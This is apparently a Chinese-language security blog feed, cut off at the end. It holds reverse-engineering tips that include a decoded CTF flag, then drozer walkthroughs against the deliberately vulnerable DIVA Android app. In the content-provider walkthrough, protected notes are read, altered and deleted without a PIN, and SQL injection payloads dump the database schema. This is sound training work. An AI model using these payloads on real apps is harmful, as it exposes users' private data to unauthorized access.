.rodata:0000000000002048 db 73h ; s
.rodata:0000000000002049 db 0
.rodata:000000000000204A db 0
.rodata:000000000000204B db 0
.rodata:000000000000204C db 31h ; 1
.rodata:000000000000204D db 0
.rodata:000000000000204E db 0
.rodata:000000000000204F db 0
.rodata:0000000000002050 db 6Eh ; n
.rodata:0000000000002051 db 0
.rodata:0000000000002052 db 0
.rodata:0000000000002053 db 0
.rodata:0000000000002054 db 67h ; g
.rodata:0000000000002055 db 0
.rodata:0000000000002056 db 0
.rodata:0000000000002057 db 0
.rodata:0000000000002058 db 5Fh ; _
.rodata:0000000000002059 db 0
.rodata:000000000000205A db 0
.rodata:000000000000205B db 0
.rodata:000000000000205C db 33h ; 3
.rodata:000000000000205D db 0
.rodata:000000000000205E db 0
.rodata:000000000000205F db 0
.rodata:0000000000002060 db 6Eh ; n
.rodata:0000000000002061 db 0
.rodata:0000000000002062 db 0
.rodata:0000000000002063 db 0
.rodata:0000000000002064 db 67h ; g
.rodata:0000000000002065 db 0
.rodata:0000000000002066 db 0
.rodata:0000000000002067 db 0
.rodata:0000000000002068 db 69h ; i
.rodata:0000000000002069 db 0
.rodata:000000000000206A db 0
.rodata:000000000000206B db 0
.rodata:000000000000206C db 6Eh ; n
.rodata:000000000000206D db 0
.rodata:000000000000206E db 0
.rodata:000000000000206F db 0
.rodata:0000000000002070 db 65h ; e
.rodata:0000000000002071 db 0
.rodata:0000000000002072 db 0
.rodata:0000000000002073 db 0
.rodata:0000000000002074 db 65h ; e
.rodata:0000000000002075 db 0
.rodata:0000000000002076 db 0
.rodata:0000000000002077 db 0
.rodata:0000000000002078 db 72h ; r
.rodata:0000000000002079 db 0
.rodata:000000000000207A db 0
.rodata:000000000000207B db 0
.rodata:000000000000207C db 35h ; 5
.rodata:000000000000207D db 0
.rodata:000000000000207E db 0
.rodata:000000000000207F db 0
.rodata:0000000000002080 db 7Dh ; }
.rodata:0000000000002081 db 0
.rodata:0000000000002082 db 0
.rodata:0000000000002083 db 0
.rodata:0000000000002084 db 0
.rodata:0000000000002085 db 0
.rodata:0000000000002086 db 0
.rodata:0000000000002087 db 0
&lt;/code>&lt;/pre>$\downarrow$
&lt;pre tabindex="0">&lt;code>.rodata:0000000000002008 dword_2008 dd 46h, 4Ch, 41h, 47h, 7Bh, 68h, 33h, 2 dup(31h), 4Fh, 5Fh, 72h, 65h, 76h, 65h, 72h, 73h, 31h, 6Eh, 67h
.rodata:0000000000002008 ; DATA XREF: main+8↑o
.rodata:0000000000002008 dd 5Fh, 33h, 6Eh, 67h, 69h, 6Eh, 2 dup(65h), 72h, 35h, 7Dh, 0
&lt;/code>&lt;/pre>$\downarrow$
&lt;pre tabindex="0">&lt;code>.rodata:0000000000002008 text &amp;#34;UTF-32LE&amp;#34;, &amp;#39;FLAG{h311O_revers1ng_3ngineer5}&amp;#39;,0
&lt;/code>&lt;/pre>:::&lt;/li>
&lt;li>如何快速把bytes dump出來
:::spoiler
&lt;ol>
&lt;li>選擇要輸出的bytes
&lt;img src="https://hackmd.io/_uploads/Syc9UkTM6.png" alt="" />&lt;/li>
&lt;li>按Shift+E，跳出的視窗選擇想要的格式，再直接複製即可
&lt;img src="https://hackmd.io/_uploads/SJ7a8ypfT.png" alt="" />
:::&lt;/li>
&lt;/ol>
&lt;/li>
&lt;li>如果函式沒有return東西的話，可以右鍵該函示，選擇&lt;code>Remove return value&lt;/code>或是Shift+Del
:::spoiler
&lt;img src="https://hackmd.io/_uploads/HkRk3JpG6.png" alt="" />
:::&lt;/li>
&lt;li>如果function中的宣告很多，可以右鍵選擇&lt;code>Collapse declarations&lt;/code>
:::spoiler
&lt;img src="https://hackmd.io/_uploads/SkOXU4AMa.png" alt="" />
:::&lt;/li>
&lt;/ul>
&lt;h2 id="x64dbg-常用快捷鍵">
 x64dbg 常用快捷鍵
 &lt;a class="anchor" href="#x64dbg-%e5%b8%b8%e7%94%a8%e5%bf%ab%e6%8d%b7%e9%8d%b5">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>F2: 設定中斷點&lt;/li>
&lt;li>F9: 繼續執行&lt;/li>
&lt;li>F8: 步過&lt;/li>
&lt;li>F7: 步入&lt;/li>
&lt;li>Ctrl+F9: 執行到 ret&lt;/li>
&lt;li>==Ctrl+G==: goto&lt;/li>
&lt;li>==Space==: 修改組譯&lt;/li>
&lt;/ul>
&lt;h3 id="靜態分析">
 靜態分析
 &lt;a class="anchor" href="#%e9%9d%9c%e6%85%8b%e5%88%86%e6%9e%90">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>PEview&lt;/li>
&lt;li>PEViewer&lt;/li>
&lt;li>PE-bear&lt;/li>
&lt;/ul>
&lt;h3 id="動態分析">
 動態分析
 &lt;a class="anchor" href="#%e5%8b%95%e6%85%8b%e5%88%86%e6%9e%90">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>OllyDbg&lt;/li>
&lt;li>x64dbg&lt;/li>
&lt;li>IDA&lt;/li>
&lt;li>Ghidra&lt;/li>
&lt;li>Windbg&lt;/li>
&lt;li>PEtool&lt;/li>
&lt;/ul>
&lt;h3 id="process相關的操作與資訊">
 Process相關的操作與資訊
 &lt;a class="anchor" href="#process%e7%9b%b8%e9%97%9c%e7%9a%84%e6%93%8d%e4%bd%9c%e8%88%87%e8%b3%87%e8%a8%8a">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>Procexp &amp;amp; Process Hacker
好看版的工作管理員&lt;/li>
&lt;li>Procmon
監控程序行為
Registry
File system
Network
Process/Thread&lt;/li>
&lt;/ul>
&lt;h3 id="好用的解題工具">
 好用的解題工具
 &lt;a class="anchor" href="#%e5%a5%bd%e7%94%a8%e7%9a%84%e8%a7%a3%e9%a1%8c%e5%b7%a5%e5%85%b7">#&lt;/a>
&lt;/h3>
&lt;ul>
&lt;li>&lt;a href="https://docs.angr.io/en/latest/appendix/cheatsheet.html">angr - cheatsheet&lt;/a>: &lt;code>$ pip install angr claripy&lt;/code>&lt;/li>
&lt;li>z3: &lt;code>$ pip install z3-solver&lt;/code>&lt;/li>
&lt;/ul></description></item><item><title>Test DIVA - activity exported</title><link>https://bernie6401.github.io/tools/others/android-related/drozer/test-diva/test-diva---activity-exported/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-related/drozer/test-diva/test-diva---activity-exported/</guid><description>&lt;ul>
&lt;li>DIVA - &lt;a href="https://payatu.com/wp-content/uploads/2016/01/diva-beta.tar.gz">Download&lt;/a>&lt;/li>
&lt;/ul>
&lt;h1 id="test-diva---activity-exported">
 Test DIVA - activity exported
 &lt;a class="anchor" href="#test-diva---activity-exported">#&lt;/a>
&lt;/h1>
&lt;p>參考&lt;sup id="fnref:1">&lt;a href="#fn:1" class="footnote-ref" role="doc-noteref">1&lt;/a>&lt;/sup>&lt;sup id="fnref:2">&lt;a href="#fn:2" class="footnote-ref" role="doc-noteref">2&lt;/a>&lt;/sup>&lt;sup id="fnref:3">&lt;a href="#fn:3" class="footnote-ref" role="doc-noteref">3&lt;/a>&lt;/sup>&lt;sup id="fnref:4">&lt;a href="#fn:4" class="footnote-ref" role="doc-noteref">4&lt;/a>&lt;/sup>&lt;/p>
&lt;ol>
&lt;li>
&lt;p>起手式 - 確認App資訊&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.package.list -f diva
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>jakhar.aseem.diva &lt;span style="color:#f92672">(&lt;/span>Diva&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.package.info -a jakhar.aseem.diva
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Package: jakhar.aseem.diva
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Application Label: Diva
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Process Name: jakhar.aseem.diva
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Version: 1.0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Data Directory: /data/user/0/jakhar.aseem.diva
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> APK Path: /data/app/~~ieYmYeSxvDRbS7R8da3n_g&lt;span style="color:#f92672">==&lt;/span>/jakhar.aseem.diva--xnWMS5i2UVEuuoE1JHskg&lt;span style="color:#f92672">==&lt;/span>/base.apk
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> UID: &lt;span style="color:#ae81ff">10282&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> GID: &lt;span style="color:#f92672">[&lt;/span>3003&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Shared Libraries: &lt;span style="color:#f92672">[&lt;/span>/system/framework/android.test.base.jar, /system/framework/org.apache.http.legacy.jar&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Shared User ID: null
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Uses Permissions:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - android.permission.WRITE_EXTERNAL_STORAGE
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - android.permission.READ_EXTERNAL_STORAGE
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - android.permission.INTERNET
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - android.permission.POST_NOTIFICATIONS
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - android.permission.ACCESS_MEDIA_LOCATION
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - android.permission.READ_MEDIA_AUDIO
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - android.permission.READ_MEDIA_VIDEO
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - android.permission.READ_MEDIA_IMAGES
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Defines Permissions:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> - None
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.package.attacksurface jakhar.aseem.diva
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attack Surface:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">3&lt;/span> activities exported
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">0&lt;/span> broadcast receivers exported
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">1&lt;/span> content providers exported
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ae81ff">0&lt;/span> services exported
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> is debuggable
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>package name: jakhar.aseem.diva
attack surface: activities exported/content providers exported/is debuggable&lt;/p></description></item><item><title>Test DIVA - content provider exported - DB Based</title><link>https://bernie6401.github.io/tools/others/android-related/drozer/test-diva/test-diva---content-provider-exported---db-based/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/tools/others/android-related/drozer/test-diva/test-diva---content-provider-exported---db-based/</guid><description>&lt;h1 id="test-diva---content-provider-exported---db-based">
 Test DIVA - content provider exported - DB Based
 &lt;a class="anchor" href="#test-diva---content-provider-exported---db-based">#&lt;/a>
&lt;/h1>
&lt;p>這一題是第&lt;code>11. Access Control Issues - Part 3&lt;/code>，用意是要我們不需要PIN code就可以access儲存起來的notes&lt;/p>
&lt;ol>
&lt;li>起手式
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.info -a jakhar.aseem.diva
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Package: jakhar.aseem.diva
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Authority: jakhar.aseem.diva.provider.notesprovider
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Read Permission: null
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Write Permission: null
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Content Provider: jakhar.aseem.diva.NotesProvider
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Multiprocess Allowed: False
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Grant Uri Permissions: False
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Uri Permission Patterns:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Path Permissions:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run scanner.provider.finduris -a jakhar.aseem.diva
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanning jakhar.aseem.diva...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>No respone from content URI: content://jakhar.aseem.diva.provider.notesprovider/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Got a response from content Uri: content://jakhar.aseem.diva.provider.notesprovider/notes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>No respone from content URI: content://jakhar.aseem.diva.provider.notesprovider
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Got a response from content Uri: content://jakhar.aseem.diva.provider.notesprovider/notes/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>For sure accessible content URIs:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://jakhar.aseem.diva.provider.notesprovider/notes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://jakhar.aseem.diva.provider.notesprovider/notes/
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>從以上測試結果可以知道&lt;code>jakhar.aseem.diva.NotesProvider&lt;/code>的狀況，以及對應的URI為何&lt;/li>
&lt;li>逆向
從&lt;code>NotesProvider&lt;/code>這個class可以知道他就是一個負責管理Notes資料庫的一個class，並且同時負責query/update/insert/delete這幾個function，那我們是不是也可以用和Sieve類似的方法對這個database發出request&lt;/li>
&lt;li>query/insert/update/delete/sqli
&lt;ul>
&lt;li>query
我們達到了一開始題目的要求，只需要直接query就好了
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --vertical
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _id &lt;span style="color:#ae81ff">5&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>title Exercise
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> note Alternate days running
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _id &lt;span style="color:#ae81ff">4&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>title Expense
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> note Spent too much on home theater
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _id &lt;span style="color:#ae81ff">6&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>title Weekend
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> note b333333333333r
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _id &lt;span style="color:#ae81ff">3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>title holiday
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> note Either Goa or Amsterdam
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _id &lt;span style="color:#ae81ff">2&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>title home
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> note Buy toys &lt;span style="color:#66d9ef">for&lt;/span> baby, Order dinner
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> _id &lt;span style="color:#ae81ff">1&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>title office
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> note &lt;span style="color:#ae81ff">10&lt;/span> Meetings. &lt;span style="color:#ae81ff">5&lt;/span> Calls. Lunch with CEO
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>insert
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.insert content://jakhar.aseem.diva.provider.notesprovider/notes --integer _id &lt;span style="color:#ae81ff">7&lt;/span> --string title pwn1 --string note pwnpwn1
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Done.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| _id | title | note |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">5&lt;/span> | Exercise | Alternate days running |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">4&lt;/span> | Expense | Spent too much on home theater |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">6&lt;/span> | Weekend | b333333333333r |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">3&lt;/span> | holiday | Either Goa or Amsterdam |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">2&lt;/span> | home | Buy toys &lt;span style="color:#66d9ef">for&lt;/span> baby, Order dinner |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">1&lt;/span> | office | &lt;span style="color:#ae81ff">10&lt;/span> Meetings. &lt;span style="color:#ae81ff">5&lt;/span> Calls. Lunch with CEO |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">7&lt;/span> | pwn1 | pwnpwn1 |
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>update
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.update content://jakhar.aseem.diva.provider.notesprovider/notes --selection &lt;span style="color:#e6db74">&amp;#34;_id=?&amp;#34;&lt;/span> --selectio
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>n-args &lt;span style="color:#ae81ff">7&lt;/span> --string title pwn2 --string note pwnpwn2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Done.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| _id | title | note |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">5&lt;/span> | Exercise | Alternate days running |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">4&lt;/span> | Expense | Spent too much on home theater |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">6&lt;/span> | Weekend | b333333333333r |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">3&lt;/span> | holiday | Either Goa or Amsterdam |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">2&lt;/span> | home | Buy toys &lt;span style="color:#66d9ef">for&lt;/span> baby, Order dinner |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">1&lt;/span> | office | &lt;span style="color:#ae81ff">10&lt;/span> Meetings. &lt;span style="color:#ae81ff">5&lt;/span> Calls. Lunch with CEO |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">7&lt;/span> | pwn2 | pwnpwn2 |
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>delete
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.delete content://jakhar.aseem.diva.provider.notesprovider/notes --selection &lt;span style="color:#e6db74">&amp;#34;_id=?&amp;#34;&lt;/span> --selection
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-args &lt;span style="color:#ae81ff">7&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Done.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| _id | title | note |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">5&lt;/span> | Exercise | Alternate days running |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">4&lt;/span> | Expense | Spent too much on home theater |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">6&lt;/span> | Weekend | b333333333333r |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">3&lt;/span> | holiday | Either Goa or Amsterdam |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">2&lt;/span> | home | Buy toys &lt;span style="color:#66d9ef">for&lt;/span> baby, Order dinner |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>| &lt;span style="color:#ae81ff">1&lt;/span> | office | &lt;span style="color:#ae81ff">10&lt;/span> Meetings. &lt;span style="color:#ae81ff">5&lt;/span> Calls. Lunch with CEO |
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>sqli
測試的payload如下，的確出現sqli的漏洞，而且可以看到完整的table
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --selection &lt;span style="color:#e6db74">&amp;#34;&amp;#39;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Exception occured: unrecognized token: &lt;span style="color:#e6db74">&amp;#34;&amp;#39;) ORDER BY title&amp;#34;&lt;/span> &lt;span style="color:#f92672">(&lt;/span>code &lt;span style="color:#ae81ff">1&lt;/span> SQLITE_ERROR&lt;span style="color:#f92672">)&lt;/span>: , &lt;span style="color:#66d9ef">while&lt;/span> compiling: SELECT * FROM notes WHERE &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#e6db74">&amp;#39;) ORDER BY title
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">dz&amp;gt; run app.provider.query content://jakhar.aseem.diva.provider.notesprovider/notes --projection &amp;#34;* FROM SQLITE_MASTER WHERE type=&amp;#39;&lt;/span>table&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>;--&lt;span style="color:#e6db74">&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">Attempting to run shell module
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">| type | name | tbl_name | rootpage | sql |
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">| table | android_metadata | android_metadata | 3 | CREATE TABLE android_metadata (locale TEXT) |
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">| table | notes | notes | 4 | CREATE TABLE notes (_id INTEGER PRIMARY KEY AUTOINCREMENT, title TEXT NOT NULL, note TEXT NOT NULL) |
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">| table | sqlite_sequence | sqlite_sequence | 5 | CREATE TABLE sqlite_sequence(name,seq) |
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>也可以透過drozer自動找可能的點
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>dz&amp;gt; run scanner.provider.injection -a jakhar.aseem.diva
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanning jakhar.aseem.diva...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Not Vulnerable:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://jakhar.aseem.diva.provider.notesprovider/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://jakhar.aseem.diva.provider.notesprovider
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Injection in Projection:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://jakhar.aseem.diva.provider.notesprovider/notes/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://jakhar.aseem.diva.provider.notesprovider/notes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Injection in Selection:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://jakhar.aseem.diva.provider.notesprovider/notes/
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> content://jakhar.aseem.diva.provider.notesprovider/notes
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>dz&amp;gt; run scanner.provider.sqltables -a jakhar.aseem.diva
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Attempting to run shell module
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Scanning jakhar.aseem.diva...
